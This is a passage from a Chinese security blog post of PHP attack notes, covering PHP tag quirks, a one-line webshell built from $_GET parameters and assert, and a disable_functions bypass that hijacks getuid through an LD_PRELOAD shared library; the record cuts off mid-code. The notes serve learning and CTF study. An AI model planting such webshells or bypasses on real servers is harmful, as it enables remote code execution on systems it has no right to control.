<!DOCTYPE html>
<html lang="zh">
    <!-- title -->




<!-- keywords -->




<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" >
    <meta name="author" content="fe1w0">
    <meta name="renderer" content="webkit">
    <meta name="copyright" content="fe1w0">
    
    <meta name="keywords" content="fe1w0,fe1w0,fe1w0-blog">
    
    <meta name="description" content="">
    <meta name="description" content="php-å®‰å…¨çŸ¥è¯†ç‚¹Â·æ‚è®°ğŸ¤¹â€ è‹¥æœ‰ä¾µæƒ,è¯·è”ç³»åˆ é™¤ä¿®æ”¹ fe1w0  php_protocol https:&#x2F;&#x2F;www.php.net&#x2F;manual&#x2F;zh&#x2F;wrappers.php  å·§ç”¨åˆ©ç”¨filtercompress.bzip2:&#x2F;&#x2F;  ä¸ phar:&#x2F;&#x2F;ç»•è¿‡dieå…¶ä»–php æ ‡ç­¾ä¸ç‰ˆæœ¬é—®é¢˜1234567891011121314151617181920212223242526When php">
<meta property="og:type" content="article">
<meta property="og:title" content="php-å®‰å…¨çŸ¥è¯†ç‚¹Â·æ‚è®°">
<meta property="og:url" content="https://fe1w0.github.io/2020/11/15/php_%E5%AE%89%E5%85%A8%E6%9D%82%E8%AE%B0/index.html">
<meta property="og:site_name" content="fe1w0">
<meta property="og:description" content="php-å®‰å…¨çŸ¥è¯†ç‚¹Â·æ‚è®°ğŸ¤¹â€ è‹¥æœ‰ä¾µæƒ,è¯·è”ç³»åˆ é™¤ä¿®æ”¹ fe1w0  php_protocol https:&#x2F;&#x2F;www.php.net&#x2F;manual&#x2F;zh&#x2F;wrappers.php  å·§ç”¨åˆ©ç”¨filtercompress.bzip2:&#x2F;&#x2F;  ä¸ phar:&#x2F;&#x2F;ç»•è¿‡dieå…¶ä»–php æ ‡ç­¾ä¸ç‰ˆæœ¬é—®é¢˜1234567891011121314151617181920212223242526When php">
<meta property="og:locale">
<meta property="og:image" content="http://img.xzaslxr.xyz/img/image-20201112214758521.png">
<meta property="og:image" content="http://img.xzaslxr.xyz/img/image-20201115173845985.png">
<meta property="og:image" content="http://img.xzaslxr.xyz/img/image-20201115173636858.png">
<meta property="og:image" content="http://img.xzaslxr.xyz/img/image-20201115173703808.png">
<meta property="article:published_time" content="2020-11-15T08:58:29.000Z">
<meta property="article:modified_time" content="2021-03-14T16:15:42.108Z">
<meta property="article:author" content="fe1w0">
<meta property="article:tag" content="web">
<meta property="article:tag" content="php">
<meta property="article:tag" content="bypass_open_basedir">
<meta property="article:tag" content="bypass_disable_function">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://img.xzaslxr.xyz/img/image-20201112214758521.png">
    <meta http-equiv="Cache-control" content="no-cache">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
    
    <title>php-å®‰å…¨çŸ¥è¯†ç‚¹Â·æ‚è®° Â· fe1w0_blog</title>
    <style type="text/css">
    @font-face {
        font-family: 'Oswald-Regular';
        src: url("/font/Oswald-Regular.ttf");
    }

    body {
        margin: 0;
    }

    header,
    footer,
    .back-top,
    .sidebar,
    .container,
    .site-intro-meta,
    .toc-wrapper {
        display: none;
    }

    .site-intro {
        position: relative;
        z-index: 3;
        width: 100%;
        /* height: 50vh; */
        overflow: hidden;
    }

    .site-intro-placeholder {
        position: absolute;
        z-index: -2;
        top: 0;
        left: 0;
        width: calc(100% + 300px);
        height: 100%;
        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
        background-position: center center;
        transform: translate3d(-226px, 0, 0);
        animation: gradient-move 2.5s ease-out 0s infinite;
    }

    @keyframes gradient-move {
        0% {
            transform: translate3d(-226px, 0, 0);
        }
        100% {
            transform: translate3d(0, 0, 0);
        }
    }

</style>

    <link rel="preload" href= "/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'" />
    <link rel="stylesheet" href= "/css/mobile.css?v=20180824" media="(max-width: 980px)">
    
    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'" />
    
    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
/* This file is meant as a standalone workflow for
- testing support for link[rel=preload]
- enabling async CSS loading in browsers that do not support rel=preload
- applying rel preload css once loaded, whether supported or not.
*/ -->
<script>
(function( w ){
	"use strict";
	// rel=preload support test
	if( !w.loadCSS ){
		w.loadCSS = function(){};
	}
	// define on the loadCSS obj
	var rp = loadCSS.relpreload = {};
	// rel=preload feature support test
	// runs once and returns a function for compat purposes
	rp.support = (function(){
		var ret;
		try {
			ret = w.document.createElement( "link" ).relList.supports( "preload" );
		} catch (e) {
			ret = false;
		}
		return function(){
			return ret;
		};
	})();

	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
	// then change that media back to its intended value on load
	rp.bindMediaToggle = function( link ){
		// remember existing media attr for ultimate state, or default to 'all'
		var finalMedia = link.media || "all";

		function enableStylesheet(){
			link.media = finalMedia;
		}

		// bind load handlers to enable media
		if( link.addEventListener ){
			link.addEventListener( "load", enableStylesheet );
		} else if( link.attachEvent ){
			link.attachEvent( "onload", enableStylesheet );
		}

		// Set rel and non-applicable media type to start an async request
		// note: timeout allows this to happen async to let rendering continue in IE
		setTimeout(function(){
			link.rel = "stylesheet";
			link.media = "only x";
		});
		// also enable media after 3 seconds,
		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
		setTimeout( enableStylesheet, 3000 );
	};

	// loop through link elements in DOM
	rp.poly = function(){
		// double check this to prevent external calls from running
		if( rp.support() ){
			return;
		}
		var links = w.document.getElementsByTagName( "link" );
		for( var i = 0; i < links.length; i++ ){
			var link = links[ i ];
			// qualify links to those with rel=preload and as=style attrs
			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
				// prevent rerunning on link
				link.setAttribute( "data-loadcss", true );
				// bind listeners to toggle media back
				rp.bindMediaToggle( link );
			}
		}
	};

	// if unsupported, run the polyfill
	if( !rp.support() ){
		// run once at least
		rp.poly();

		// rerun poly on an interval until onload
		var run = w.setInterval( rp.poly, 500 );
		if( w.addEventListener ){
			w.addEventListener( "load", function(){
				rp.poly();
				w.clearInterval( run );
			} );
		} else if( w.attachEvent ){
			w.attachEvent( "onload", function(){
				rp.poly();
				w.clearInterval( run );
			} );
		}
	}


	// commonjs
	if( typeof exports !== "undefined" ){
		exports.loadCSS = loadCSS;
	}
	else {
		w.loadCSS = loadCSS;
	}
}( typeof global !== "undefined" ? global : this ) );
</script>

    <link rel="icon" href= "/assets/favicon.jpg" />
    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script" />
    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script" />
    <link rel="preload" href="/scripts/main.js" as="script" />
    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
    
    <!-- fancybox -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
    <!-- ç™¾åº¦ç»Ÿè®¡  -->
    
    <!-- è°·æ­Œç»Ÿè®¡  -->
    
<meta name="generator" content="Hexo 5.2.0"></head>

    
        <body class="post-body">
    
    
<header class="header">

    <div class="read-progress"></div>
    <div class="header-sidebar-menu">&#xe775;</div>
    <!-- posté¡µçš„toggle banner  -->
    
    <div class="banner">
            <div class="blog-title">
                <a href="/" >follow my dream</a>
            </div>
            <div class="post-title">
                <a href="#" class="post-name">php-å®‰å…¨çŸ¥è¯†ç‚¹Â·æ‚è®°</a>
            </div>
    </div>
    
    <a class="home-link" href=/>follow my dream</a>
</header>
    <div class="wrapper">
        <div class="site-intro" style="







height:50vh;
">
    
    <!-- ä¸»é¡µ  -->
    
    
    <!-- 404é¡µ  -->
            
    <div class="site-intro-placeholder"></div>
    <div class="site-intro-img" style="background-image: url(/intro/index-bg.jpg)"></div>
    <div class="site-intro-meta">
        <!-- æ ‡é¢˜  -->
        <h1 class="intro-title">
            <!-- ä¸»é¡µ  -->
            
            php-å®‰å…¨çŸ¥è¯†ç‚¹Â·æ‚è®°
            <!-- 404 -->
            
        </h1>
        <!-- å‰¯æ ‡é¢˜ -->
        <p class="intro-subtitle">
            <!-- ä¸»é¡µå‰¯æ ‡é¢˜  -->
            
            
            <!-- 404 -->
            
        </p>
        <!-- æ–‡ç« é¡µmeta -->
        
            <div class="post-intros">
                <!-- æ–‡ç« é¡µæ ‡ç­¾  -->
                
                    <div class= post-intro-tags >
    
        <a class="post-tag" href="javascript:void(0);" data-tags = "web">web</a>
    
        <a class="post-tag" href="javascript:void(0);" data-tags = "php">php</a>
    
        <a class="post-tag" href="javascript:void(0);" data-tags = "bypass_open_basedir">bypass_open_basedir</a>
    
        <a class="post-tag" href="javascript:void(0);" data-tags = "bypass_disable_function">bypass_disable_function</a>
    
</div>
                
                
                    <div class="post-intro-read">
                        <span>å­—æ•°ç»Ÿè®¡: <span class="post-count word-count">9k</span>é˜…è¯»æ—¶é•¿: <span class="post-count reading-time">50 min</span></span>
                    </div>
                
                <div class="post-intro-meta">
                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
                    <span class="post-intro-time">2020/11/15</span>
                    
                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
                        <span class="iconfont-archer">&#xe602;</span>
                        <span id="busuanzi_value_page_pv"></span>
                    </span>
                    
                    <span class="shareWrapper">
                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
                        <span class="shareText">Share</span>
                        <ul class="shareList">
                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
                                <div class="share-qrcode"></div>
                            </li>
                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
                        </ul>
                    </span>
                </div>
            </div>
        
    </div>
</div>
        <script>
 
  // get user agent
  var browser = {
    versions: function () {
      var u = window.navigator.userAgent;
      return {
        userAgent: u,
        trident: u.indexOf('Trident') > -1, //IEå†…æ ¸
        presto: u.indexOf('Presto') > -1, //operaå†…æ ¸
        webKit: u.indexOf('AppleWebKit') > -1, //è‹¹æœã€è°·æ­Œå†…æ ¸
        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //ç«ç‹å†…æ ¸
        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //æ˜¯å¦ä¸ºç§»åŠ¨ç»ˆç«¯
        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //iosç»ˆç«¯
        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //androidç»ˆç«¯æˆ–è€…ucæµè§ˆå™¨
        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //æ˜¯å¦ä¸ºiPhoneæˆ–è€…å®‰å“QQæµè§ˆå™¨
        iPad: u.indexOf('iPad') > -1, //æ˜¯å¦ä¸ºiPad
        webApp: u.indexOf('Safari') == -1, //æ˜¯å¦ä¸ºwebåº”ç”¨ç¨‹åºï¼Œæ²¡æœ‰å¤´éƒ¨ä¸åº•éƒ¨
        weixin: u.indexOf('MicroMessenger') == -1, //æ˜¯å¦ä¸ºå¾®ä¿¡æµè§ˆå™¨
        uc: u.indexOf('UCBrowser') > -1 //æ˜¯å¦ä¸ºandroidä¸‹çš„UCæµè§ˆå™¨
      };
    }()
  }
  console.log("userAgent:" + browser.versions.userAgent);

  // callback
  function fontLoaded() {
    console.log('font loaded');
    if (document.getElementsByClassName('site-intro-meta')) {
      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
      var postIntros = document.getElementsByClassName('post-intros')[0]
      if (postIntros) {
        postIntros.classList.add('post-fade-in');
      }
    }
  }

  // UCä¸æ”¯æŒè·¨åŸŸï¼Œæ‰€ä»¥ç›´æ¥æ˜¾ç¤º
  function asyncCb(){
    if (browser.versions.uc) {
      console.log("UCBrowser");
      fontLoaded();
    } else {
      WebFont.load({
        custom: {
          families: ['Oswald-Regular']
        },
        loading: function () {  //æ‰€æœ‰å­—ä½“å¼€å§‹åŠ è½½
          // console.log('loading');
        },
        active: function () {  //æ‰€æœ‰å­—ä½“å·²æ¸²æŸ“
          fontLoaded();
        },
        inactive: function () { //å­—ä½“é¢„åŠ è½½å¤±è´¥ï¼Œæ— æ•ˆå­—ä½“æˆ–æµè§ˆå™¨ä¸æ”¯æŒåŠ è½½
          console.log('inactive: timeout');
          fontLoaded();
        },
        timeout: 5000 // Set the timeout to two seconds
      });
    }
  }

  function asyncErr(){
    console.warn('script load from CDN failed, will load local script')
  }

  // load webfont-loader async, and add callback function
  function async(u, cb, err) {
    var d = document, t = 'script',
      o = d.createElement(t),
      s = d.getElementsByTagName(t)[0];
    o.src = u;
    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
    s.parentNode.insertBefore(o, s);
  }

  var asyncLoadWithFallBack = function(arr, success, reject) {
      var currReject = function(){
        reject()
        arr.shift()
        if(arr.length)
          async(arr[0], success, currReject)
        }

      async(arr[0], success, currReject)
  }

  asyncLoadWithFallBack([
    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
    "/lib/webfontloader.min.js"
  ], asyncCb, asyncErr)
</script>        
        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
        <div class="container container-unloaded">
            <main class="main post-page">
    <article class="article-entry">
        <h1 id="php-å®‰å…¨çŸ¥è¯†ç‚¹Â·æ‚è®°ğŸ¤¹â€"><a href="#php-å®‰å…¨çŸ¥è¯†ç‚¹Â·æ‚è®°ğŸ¤¹â€" class="headerlink" title="php-å®‰å…¨çŸ¥è¯†ç‚¹Â·æ‚è®°ğŸ¤¹â€"></a>php-å®‰å…¨çŸ¥è¯†ç‚¹Â·æ‚è®°ğŸ¤¹â€</h1><blockquote>
<p>è‹¥æœ‰ä¾µæƒ,è¯·è”ç³»åˆ é™¤ä¿®æ”¹ fe1w0</p>
</blockquote>
<h2 id="php-protocol"><a href="#php-protocol" class="headerlink" title="php_protocol"></a>php_protocol</h2><blockquote>
<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.php">https://www.php.net/manual/zh/wrappers.php</a></p>
</blockquote>
<h3 id="å·§ç”¨åˆ©ç”¨filter"><a href="#å·§ç”¨åˆ©ç”¨filter" class="headerlink" title="å·§ç”¨åˆ©ç”¨filter"></a>å·§ç”¨åˆ©ç”¨filter</h3><h4 id="compress-bzip2-ä¸-phar"><a href="#compress-bzip2-ä¸-phar" class="headerlink" title="compress.bzip2://  ä¸ phar://"></a><code>compress.bzip2:// </code> ä¸ <code>phar://</code></h4><h3 id="ç»•è¿‡die"><a href="#ç»•è¿‡die" class="headerlink" title="ç»•è¿‡die"></a>ç»•è¿‡<code>die</code></h3><h3 id="å…¶ä»–"><a href="#å…¶ä»–" class="headerlink" title="å…¶ä»–"></a>å…¶ä»–</h3><h2 id="php-æ ‡ç­¾ä¸ç‰ˆæœ¬é—®é¢˜"><a href="#php-æ ‡ç­¾ä¸ç‰ˆæœ¬é—®é¢˜" class="headerlink" title="php æ ‡ç­¾ä¸ç‰ˆæœ¬é—®é¢˜"></a>php æ ‡ç­¾ä¸ç‰ˆæœ¬é—®é¢˜</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">When php parse a file,it looks for opening and closing tag.php parser interpreting  the code between opening and closing tag and allows php to be embedded in all shorts of different documents.Outside of opening and closing tag is ignored by the php parser.</span><br><span class="line"></span><br><span class="line">Now php recommended you to use only two tags.</span><br><span class="line"></span><br><span class="line">1.Standard tag which is &lt;?php echo &quot;I&#39;m Standard tag&quot;; ?&gt;</span><br><span class="line">2.Short echo tag which is &lt;?&#x3D; &quot;I&#39;m Short echo tag&quot;; ?&gt;</span><br><span class="line"></span><br><span class="line">Both are not affected by php ini configuration file directive.</span><br><span class="line"></span><br><span class="line">Although php also allow short open tag which is discoursed but still available if php was configured with --enable-short-tags or  short_open_tag is enabled in php ini configuration file directive.</span><br><span class="line"></span><br><span class="line">if you want to use php in combination with xml,you can disable short_open_tag in order to use &lt;?xml ?&gt; inline.</span><br><span class="line">Otherwise, you can print it with PHP, for example: &lt;?php echo &#39;&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&#39;; ?&gt;</span><br><span class="line"></span><br><span class="line">short_echo_tag also affected the short echo tag before 5.4.0</span><br><span class="line">since 5.4.0,short echo tag is always available.</span><br><span class="line"></span><br><span class="line">asp tag &lt;% %&gt; and &lt;%&#x3D; &gt; are removed from php 7</span><br><span class="line">script tag &lt;script language&#x3D;&quot;php&quot;&gt; &lt;script&#x2F;&gt; also removed from php 7</span><br><span class="line"></span><br><span class="line">It is preferable to omit the closing tag if a file only contain the php code.</span><br><span class="line">&lt;?php echo &quot;a statement&quot;;</span><br><span class="line">      echo &quot;another statement&quot;;</span><br><span class="line"></span><br><span class="line">It prevent unwanted whitespace or new line being added after the closing tag.</span><br><span class="line">--happy-gazi|php-</span><br></pre></td></tr></table></figure>

<blockquote>
<p>from <a target="_blank" rel="noopener" href="https://www.php.net/manual/en/language.basic-syntax.phptags.php">https://www.php.net/manual/en/language.basic-syntax.phptags.php</a></p>
</blockquote>
<h2 id="ç‰¹æ®Šæ„é€ webshell"><a href="#ç‰¹æ®Šæ„é€ webshell" class="headerlink" title="ç‰¹æ®Šæ„é€ webshell"></a>ç‰¹æ®Šæ„é€ webshell</h2><blockquote>
<p>refer:</p>
<p><a target="_blank" rel="noopener" href="https://github.com/EddieIvan01/Generate_Char_By_Xor">https://github.com/EddieIvan01/Generate_Char_By_Xor</a></p>
</blockquote>
<h3 id="åˆ©ç”¨æ— å­—æ¯æ¥æ„é€ webshell"><a href="#åˆ©ç”¨æ— å­—æ¯æ¥æ„é€ webshell" class="headerlink" title="åˆ©ç”¨æ— å­—æ¯æ¥æ„é€ webshell"></a>åˆ©ç”¨æ— å­—æ¯æ¥æ„é€ webshell</h3><h3 id="åˆ©ç”¨æ•°å­¦è®¡ç®—ç¬¦å·æ¥æ„é€ webshell"><a href="#åˆ©ç”¨æ•°å­¦è®¡ç®—ç¬¦å·æ¥æ„é€ webshell" class="headerlink" title="åˆ©ç”¨æ•°å­¦è®¡ç®—ç¬¦å·æ¥æ„é€ webshell"></a>åˆ©ç”¨æ•°å­¦è®¡ç®—ç¬¦å·æ¥æ„é€ webshell</h3><h3 id="PHP-Parametric-Function-RCE"><a href="#PHP-Parametric-Function-RCE" class="headerlink" title="PHP-Parametric-Function-RCE"></a>PHP-Parametric-Function-RCE</h3><p><a target="_blank" rel="noopener" href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/">https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/</a></p>
<h3 id="webshell-ç»“æ„ä¸å…¶ä»–é—®é¢˜"><a href="#webshell-ç»“æ„ä¸å…¶ä»–é—®é¢˜" class="headerlink" title="webshell ç»“æ„ä¸å…¶ä»–é—®é¢˜"></a>webshell ç»“æ„ä¸å…¶ä»–é—®é¢˜</h3><h4 id="assert"><a href="#assert" class="headerlink" title=" assert"></a><code> assert</code></h4><p>ä¸»è¦è®°å½•è¿™ä¸€ç‚¹çš„åŸå› æ˜¯  <code> assert</code> å¯æ‹¼æ¥æ‰§è¡Œä¸php ç‰ˆæœ¬é—´çš„å…³ç³» </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$a = $_GET[<span class="number">1</span>];</span><br><span class="line">$b = $_GET[<span class="number">2</span>];</span><br><span class="line">$b($a);</span><br></pre></td></tr></table></figure>

<p>å¯¹äºè¿™ç§ç»“æ„çš„ä»£ç ,assert åœ¨ PHPç‰ˆæœ¬ä½äº <code>7.1</code>çš„ç‰ˆæœ¬å¯ä»¥æ­£å¸¸ä½¿ç”¨,è¿˜æ˜¯è¢«è®¤ä¸ºæ˜¯å‡½æ•°,è€Œéæ˜¯è¯­è¨€ç»“æ„(ç±»ä¼¼<code>eval</code>)ã€‚</p>
<p>æµ‹è¯•çš„ç¯å¢ƒ</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php5.2.17nts  php5.4.45nts  php5.6.9nts  php7.0.9nts.log  php7.2.9nts      php7.3.4nts  php7.4.3nts</span><br><span class="line">php5.3.29nts  php5.5.9nts   php7.0.9nts  php7.1.9nts      php7.3.9nts  </span><br></pre></td></tr></table></figure>

<h2 id="bypass-disable-function-ğŸ¥™"><a href="#bypass-disable-function-ğŸ¥™" class="headerlink" title="bypass disable_function ğŸ¥™"></a>bypass disable_function ğŸ¥™</h2><blockquote>
<p>refer&amp;&amp;learn:[ä¸å…¨]</p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/208451">https://www.anquanke.com/post/id/208451</a></p>
<p><a target="_blank" rel="noopener" href="https://www.mi1k7ea.com/2019/06/02/%E6%B5%85%E8%B0%88%E5%87%A0%E7%A7%8DBypass-disable-functions%E7%9A%84%E6%96%B9%E6%B3%95/#0x01-disable-functions">https://www.mi1k7ea.com/2019/06/02/%E6%B5%85%E8%B0%88%E5%87%A0%E7%A7%8DBypass-disable-functions%E7%9A%84%E6%96%B9%E6%B3%95/#0x01-disable-functions</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.bi0s.in/2019/10/26/Web/bypass-disable-functions/">https://blog.bi0s.in/2019/10/26/Web/bypass-disable-functions/</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/web/192052.html">https://www.freebuf.com/web/192052.html</a> [æ¨è]</p>
</blockquote>
<h3 id="0x01-LD-PRELOAD"><a href="#0x01-LD-PRELOAD" class="headerlink" title="0x01 LD_PRELOAD"></a>0x01 LD_PRELOAD</h3><h4 id="0x0a-åŠ«æŒå‡½æ•°"><a href="#0x0a-åŠ«æŒå‡½æ•°" class="headerlink" title="0x0a åŠ«æŒå‡½æ•°"></a>0x0a åŠ«æŒå‡½æ•°</h4><p>LD_PRELOADæ˜¯Linuxç³»ç»Ÿçš„ä¸€ä¸ªç¯å¢ƒå˜é‡ï¼Œå®ƒå¯ä»¥å½±å“ç¨‹åºçš„è¿è¡Œæ—¶çš„é“¾æ¥ï¼ˆRuntime linkerï¼‰ï¼Œå®ƒå…è®¸ä½ å®šä¹‰åœ¨ç¨‹åºè¿è¡Œå‰ä¼˜å…ˆåŠ è½½çš„åŠ¨æ€é“¾æ¥åº“ã€‚è¿™ä¸ªåŠŸèƒ½ä¸»è¦å°±æ˜¯ç”¨æ¥æœ‰é€‰æ‹©æ€§çš„è½½å…¥ä¸åŒåŠ¨æ€é“¾æ¥åº“ä¸­çš„ç›¸åŒå‡½æ•°ã€‚é€šè¿‡è¿™ä¸ªç¯å¢ƒå˜é‡ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ä¸»ç¨‹åºå’Œå…¶åŠ¨æ€é“¾æ¥åº“çš„ä¸­é—´åŠ è½½åˆ«çš„åŠ¨æ€é“¾æ¥åº“ï¼Œç”šè‡³è¦†ç›–æ­£å¸¸çš„å‡½æ•°åº“ã€‚ä¸€æ–¹é¢ï¼Œæˆ‘ä»¬å¯ä»¥ä»¥æ­¤åŠŸèƒ½æ¥ä½¿ç”¨è‡ªå·±çš„æˆ–æ˜¯æ›´å¥½çš„å‡½æ•°ï¼ˆæ— éœ€åˆ«äººçš„æºç ï¼‰ï¼Œè€Œå¦ä¸€æ–¹é¢ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ä»¥å‘åˆ«äººçš„ç¨‹åºæ³¨å…¥ç¨‹åºï¼Œä»è€Œè¾¾åˆ°ç‰¹å®šçš„ç›®çš„ã€‚</p>
<blockquote>
<p>from <a target="_blank" rel="noopener" href="https://blog.csdn.net/chen_jianjian/article/details/80627693">https://blog.csdn.net/chen_jianjian/article/details/80627693</a></p>
</blockquote>
<p>mail.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">mail(<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>å®‰è£… strace readelf</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt install strace -y <span class="comment">#for install  strace </span></span><br><span class="line">apt install binutils -y <span class="comment">#for install  readelf</span></span><br></pre></td></tr></table></figure>

<p>æŸ¥çœ‹å¯åŠ¨çš„å­è¿›ç¨‹,æ³¨æ„è¦æ–°å¼€ä¸€ä¸ª<code>execve</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@7fda2fc3e457:/app/2020_11_5_bypass_disable_function<span class="comment"># strace -f php mail.php 2&gt;&amp;1 | grep execve</span></span><br><span class="line">execve(<span class="string">&quot;/usr/bin/php&quot;</span>, [<span class="string">&quot;php&quot;</span>, <span class="string">&quot;mail.php&quot;</span>], 0x7ffc182d8a70 /* 26 vars */) = 0</span><br><span class="line">[pid  1500] execve(<span class="string">&quot;/bin/sh&quot;</span>, [<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;/usr/sbin/sendmail -t -i&quot;</span>], 0x560324ddee70 /* 26 vars */ &lt;unfinished ...&gt;</span><br><span class="line">[pid  1500] &lt;... execve resumed&gt; )      = 0</span><br><span class="line">[pid  1501] execve(<span class="string">&quot;/usr/sbin/sendmail&quot;</span>, [<span class="string">&quot;/usr/sbin/sendmail&quot;</span>, <span class="string">&quot;-t&quot;</span>, <span class="string">&quot;-i&quot;</span>], 0x55af273c6bd0 /* 25 vars */ &lt;unfinished ...&gt;</span><br><span class="line">[pid  1501] &lt;... execve resumed&gt; )      = 0</span><br><span class="line">[pid  1502] execve(<span class="string">&quot;/usr/sbin/postdrop&quot;</span>, [<span class="string">&quot;/usr/sbin/postdrop&quot;</span>, <span class="string">&quot;-r&quot;</span>], 0x55ae359c43e0 /* 2 vars */) = 0</span><br></pre></td></tr></table></figure>

<p>æŸ¥çœ‹sendmailä½¿ç”¨äº†å“ªäº›å‡½æ•°</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readelf -s /usr/sbin/sendmail</span><br></pre></td></tr></table></figure>

<p><img src="http://img.xzaslxr.xyz/img/image-20201112214758521.png" alt="image-20201112214758521"></p>
<p>ä½¿ç”¨<code>geteuid@GLIBC_2.2.5 (3)</code>,ç¼–å†™soæ–‡ä»¶ test.c</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">payload</span><span class="params">()</span></span>&#123;</span><br><span class="line">        system(<span class="string">&quot;whoami &gt; /tmp/fe1w0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getuid</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(getenv(<span class="string">&quot;LD_PRELOAD&quot;</span>)==<span class="literal">NULL</span>)&#123; <span class="keyword">return</span> <span class="number">0</span>;&#125;</span><br><span class="line">        unsetenv(<span 